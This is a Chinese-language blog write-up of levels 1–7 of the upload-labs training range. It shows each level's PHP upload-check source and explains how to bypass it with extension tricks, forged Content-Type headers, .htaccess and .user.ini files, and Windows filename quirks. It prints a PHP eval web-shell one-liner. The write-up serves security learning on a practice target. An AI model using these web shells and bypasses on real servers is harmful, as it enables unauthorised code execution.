---
layout:     post               # 使用的布局（不需要改）
title:      upload-labs上    # 标题 
subtitle:       #副标题
date:       2020-07-07         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - upload-labs
  
---

## ***环境搭建***

Upload-labs是国内一个老哥c0ny1开源的上传漏洞靶子，下载地址

	https://github.com/c0ny1/upload-labs

与sqli-labs有些类似，主要专注于上传漏洞这一块。

我这里就直接用docekr搭建了。

	docker pull c0ny1/upload-labs
	docker run -id -p 81:80 c0ny1/upload-labs

其他方法可到上边作者的github上找教程。

//点击清空上传文件以创建upload文件夹，手动创建会上传出错！

## ***Pass-01***

先上传一个图片试试，发现功能点可用。并且还有回显，所以我们知道我们上传的文件到了哪里。

![UAeGtO.png](https://s1.ax1x.com/2020/07/07/UAeGtO.png)

上传php文件试试，结果直接一个弹框限制了上传。

![UAeajA.png](https://s1.ax1x.com/2020/07/07/UAeajA.png)


猜测这是js限制。右键源代码：

	<script type="text/javascript">
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif";
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
	</script>

它截取文件后缀，判断是否在白名单中。

两种方法。

* 浏览器禁用js代码执行。

拿火狐来说。再地址栏输入`about:config`,接受风险并继续。

搜索javascript，将第二项禁用。

![UAmlvj.png](https://s1.ax1x.com/2020/07/07/UAmlvj.png)

即可成功上传任意文件。这里上传一个小马。
`<?php eval($_POST[a]); ?>`

![UAmca6.png](https://s1.ax1x.com/2020/07/07/UAmca6.png)

* 可以抓包修改后缀

将ma.php修改为可允许上传文件。之后上传抓包。

![UAnZQJ.png](https://s1.ax1x.com/2020/07/07/UAnZQJ.png)

即可成功上传php文件。

## ***Pass-02***


黑名单过滤之文件类型校验是指HTTP头中的 Content-Type，在服务端进行校验。

Content-Type：也叫互联网媒体类型（Internet Media Type）或者 MIME 类型，

在 HTTP 协议消息头中，它用来表示具体请求中的媒体类型信息。

例如：

* text/html 代表 HTML 格式
* image/gif 代表 GIF 图片
* Image/png 代表 GIF 图片
* application/octet-stream 二进制流，不知道文件类型（PHP）
* application/json 代表 JSON 类型

开始闯关。上传php文件，提示上传类型不正确。进行抓包。

将`application/octet-stream`改为`Content-Type: image/jpeg`,成功绕过限制。

![UAuajJ.png](https://s1.ax1x.com/2020/07/07/UAuajJ.png)

分析一下源码：

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '文件类型不正确，请重新上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
	    }
	}

正如我们所想，检测的是`$_FILES['upload_file']['type']`的值。

## ***Pass-03***

黑名单过滤之文件名根据文件名进行过滤：

根据文件后缀名来判断文件是否允许上传，程序会把不允许上传的文件列到一个小本本里，

一旦发现上传的文件在小本本中就马上制止。
小本本如下所示：

`array( “.php”,”.php5″,”.php4″,”.php3″,”.php2″,”php1″, “.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5″,”.pHp4″,”.pHp3″, “.pHp2″,”pHp1″,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”, “.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”, “.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”, “.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”, “.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.htaccess” );`

绕过方法：

* 畸形后缀名

php1、php2、php3、php4、php5、php7、pht、phtml、 phar、 phps、Asp、aspx、cer、cdx、asa、asax、jsp、jspa、jspx

上述如果想要被当成php执行，需要有个前提条件，即Apache的httpd.conf有配置代码`AddType application/x-httpd-php .pht .phtml .phps .php5 .pht`.

我用的apach2版本，在`/etc/apache2/`目录下的`apache2.conf`中编辑，直接在最后添加`AddType application/x-httpd-php .php4t .phtml .phps .php5 .pht`。

	AddType 指令
	作用：在给定的文件扩展名与特定的内容类型之间建立映射
	语法：AddType MIME-type extension [extension] ...
	AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。
	AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。

上传**.htaccess文件**进行绕过，文件内容为`AddType application/x-httpd-php .jpg`,.jpg可写改为自己想要的文件后缀。这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。


前提条件为1.mod_rewrite模块开启。2.AllowOverride All。

	.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录

	下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定

	义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访

	问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该

	文件默认开启，启用和关闭在httpd.conf文件中配置。

apache2进行配置。

开启mod_rewrite模块：命令行输入`a2enmod`,终端提示可以使用的模块名称，此时输入`rewrite`,提示成功加载rewrite模块，.

AllowOverride All: `apache2.conf`编辑，将

	    <Directory /var/www/>
        Options Indexes FollowSymlinks
        AllowOverride None
        Require all granted
    	</Directory>

中的AllowOverride None改为AllowOverride All。

然后重启apache即可。`/etc/init.d/apache2 restart`

进行闯关。上传php文件提示“不允许上传.asp,.aspx,.php,.jsp后缀文件！ ”。

![UA1mOe.png](https://s1.ax1x.com/2020/07/07/UA1mOe.png)

抓包后，将php后缀随便改为一堆字符。发现可以上传，所以判定此处为黑名单过滤的。

![UA1tOg.png](https://s1.ax1x.com/2020/07/07/UA1tOg.png)

将php改为php1或者php2或者pht，不断尝试，如果网站管理者进行了不正当的配置，我们上传的文件或许是可以被php执行的。

我们这里改为pht，发现执行成功。

![UA32gf.png](https://s1.ax1x.com/2020/07/07/UA32gf.png)

这里`.htaccess`文件也可以上传成功，但是这里文件上传之后会更改原来的名字，导致`.htaccess`变为xxxxxx.htacess,导致此文件就成了普通文件。不能利用.htaccess解析漏洞了。

源代码分析：

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array('.asp','.aspx','.php','.jsp');
        	$file_name = trim($_FILES['upload_file']['name']);
        	$file_name = deldot($file_name);//删除文件名末尾的点
        	$file_ext = strrchr($file_name, '.');
        	$file_ext = strtolower($file_ext); //转换为小写
        	$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        	$file_ext = trim($file_ext); //收尾去空

        	if(!in_array($file_ext, $deny_ext)) {
        	    $temp_file = $_FILES['upload_file']['tmp_name'];
        	    $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
        	    if (move_uploaded_file($temp_file,$img_path)) {
        	         $is_upload = true;
        	    } else {
        	        $msg = '上传出错！';
        	    }
        	} else {
        	    $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        	}
    	} else {
        	$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    	}
	}


黑名单过滤加改名字策略。


## ***Pass-04***


上传php文件，出现，`提示：此文件不允许上传! `.

![UAGLBF.png](https://s1.ax1x.com/2020/07/07/UAGLBF.png)

抓包，修改文件后缀，乱修改一通。发现可以上传并且没有改名字，判定为黑名单过滤。

![UAJzVg.png](https://s1.ax1x.com/2020/07/07/UAJzVg.png)

那么，文件后缀修改为畸形后缀名(php1、php2、php3等)。当然他这里也过滤了一些畸形后缀名。

加入我是管理员，我配置不当导致php1可以以php形式执行。

一般不知道啥文件，可以多尝试上传几次畸形后缀名文件，然后尝试。

我这里上传php1成功。

![UAY8sK.png](https://s1.ax1x.com/2020/07/07/UAY8sK.png)

因为这里并没有改名字，而且并没有过滤`.htaccess`后缀，所以我们进行**.htaccess绕过**

先上传一个`.htaccess`文件，内容为:

	AddType application/x-httpd-php .phg

在上传一个`.phg`文件，内容为：	`<?php @eval($_POST[a]); ?>`成功上传并且可以以php执行。

**还可以根据：**

**配合操作系统文件命令规则**

（1）上传不符合windows文件命名规则的文件名

　　test.asp.

　　test.asp(空格)

　　test.php:1.jpg

　　test.php::$DATA

　　shell.php::$DATA…….

会被windows系统自动去掉不符合规则符号后面的内容。

（2）linux下后缀名大小写

在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

那么在windows环境中我们此处构造`ma4.php. .`,即可成功绕过检测，访问`ma4.php`就为木马位置。

我么此处来按照源代码解释一下为什么`ma4.php. .`可以绕过，

首先使用`trim`函数去掉去除首尾空白字符，还有其他特殊字符。

然后用`deldot()` ,删除文件名末尾的点,此时`$file_name=ma4.php. `,

	strrchr() 函数（在php中）查找字符在指定字符串中从右面开始的

	第一次出现的位置，如果成功，返回该字符以及其后面的字符，如果

	失败，则返回 NULL。与之相对应的是strchr()函数，它查找字符

	串中首次出现指定字符以及其后面的字符。

之后使用`strrchr()`函数，返回该函数指定字符最后一次出现的位置(此处为点)以及其后面的字符，`$file_ext=. `

之后使用`strtolower()`、`str_ireplace()`处理，`$file_ext=.` 

而此事`. `不在黑名单中，`$file_name=ma4.php. `,而因为windows特性，所以文件就变成了`ma4.php`.

我们还可以利用apache解析漏洞，上传`ma4.php.x.xx.xxx.xxxx`,进行绕过，

**Apache解析漏洞成因**：

由于Apache 识别文件的规则是根据后缀名从右往左进行识别，遇到不在识别范围内就会自动忽
略，往左进行识别，如果左边是在解析范围内的就会正常解析，而一般程序进行判断文件是否
允许上传是根据最后的后缀名进行判断的。

**Apache解析漏洞利用条件**：

Apache解析漏洞只存在于老版本中：

经测试：Apache 2.0 Apache 2.2 是存在解析漏洞的。

源代码分析：

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
    	if (file_exists(UPLOAD_PATH)) {
    	    $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
    	    $file_name = trim($_FILES['upload_file']['name']);
    	    $file_name = deldot($file_name);//删除文件名末尾的点
    	    $file_ext = strrchr($file_name, '.');
    	    $file_ext = strtolower($file_ext); //转换为小写
    	    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        	$file_ext = trim($file_ext); //收尾去空
	
        	if (!in_array($file_ext, $deny_ext)) {
            	$temp_file = $_FILES['upload_file']['tmp_name'];
           		 $img_path = UPLOAD_PATH.'/'.$file_name;
            	if (move_uploaded_file($temp_file, $img_path)) {
            	    $is_upload = true;
            	} else {
            	    $msg = '上传出错！';
            	}
        	} else {
            	$msg = '此文件不允许上传!';
        	}
    	} else {
        	$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    	}
	}

本Pass禁止了好多后缀名，并且文件后缀进行小写转换。


## ***Pass-05***

**使用 .user.ini 绕过黑名单**:

使用条件：

（1）服务器脚本语言为PHP 服务器使用CGI／FastCGI模式

（2）上传目录下要有可执行的php文件

例如：PHP study中使用 nginx 中间件的时候就可以进行实验。

使用方式：

（1）上传一张图片

（2）上传 .user.ini 文件。内容为:

auto_prepend_file=2.png（这一句即可）

（3）访问：http://IP/upload/2.png/xx.php（目录中存在的 一个php文件）

刚发现此关是会进行重命名的，所以不能用此方法绕过，还发现linux河windows关卡不太一样。。。。。

此处看一下源代码：

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
	        $file_name = trim($_FILES['upload_file']['name']);
        	$file_name = deldot($file_name);//删除文件名末尾的点
       	 	$file_ext = strrchr($file_name, '.');
        	$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        	$file_ext = trim($file_ext); //首尾去空

        	if (!in_array($file_ext, $deny_ext)) {
        	    $temp_file = $_FILES['upload_file']['tmp_name'];
        	    $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
        	    if (move_uploaded_file($temp_file, $img_path)) {
        	        $is_upload = true;
        	    } else {
        	        $msg = '上传出错！';
        	    }
        	} else {
        	    $msg = '此文件类型不允许上传！';
        	}
    	} else {
        	$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    	}
	}


这里我们看到后缀名的检测没有进行小写转换，也就是说我们可以进行大写绕过。（此关在windows下进行大小写绕过.....由于linux区分大小写所以无用，）

直接将php后缀大写绕过即可。

## Pass-06

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
	        $file_name = $_FILES['upload_file']['name'];
	        $file_name = deldot($file_name);//删除文件名末尾的点
        	$file_ext = strrchr($file_name, '.');
        	$file_ext = strtolower($file_ext); //转换为小写
        	$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
       	 if (!in_array($file_ext, $deny_ext)) {
       	     $temp_file = $_FILES['upload_file']['tmp_name'];
       	     $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
       	     if (move_uploaded_file($temp_file,$img_path)) 	{
       	         $is_upload = true;
       	     } else {
       	         $msg = '上传出错！';
       	     }
       	 } else {
       	     $msg = '此文件不允许上传';
       	 }
    	} else {
        	$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    	}
	}


发现此关并没有利用`trim`函数进行首位去空，所以在windows环境下，此关直接php后加各空格即可绕过。

## Pass-07

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        	$file_ext = trim($file_ext); //首尾去空
        
        	if (!in_array($file_ext, $deny_ext)) {
            	$temp_file = $_FILES['upload_file']['tmp_name'];
            	$img_path = UPLOAD_PATH.'/'.$file_name;
            	if (move_uploaded_file($temp_file, $img_path)) {
            	    $is_upload = true;
            	} else {
            	    $msg = '上传出错！';
            	}
        	} else {
            	$msg = '此文件类型不允许上传！';
        	}
    	} else {
       		 $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

(同样在windows环境下)分析源代码发现，此关并没有进行`deldot()`函数删除末尾的点。

所以我们就可以上传`ma7.php.`进行绕过。


















	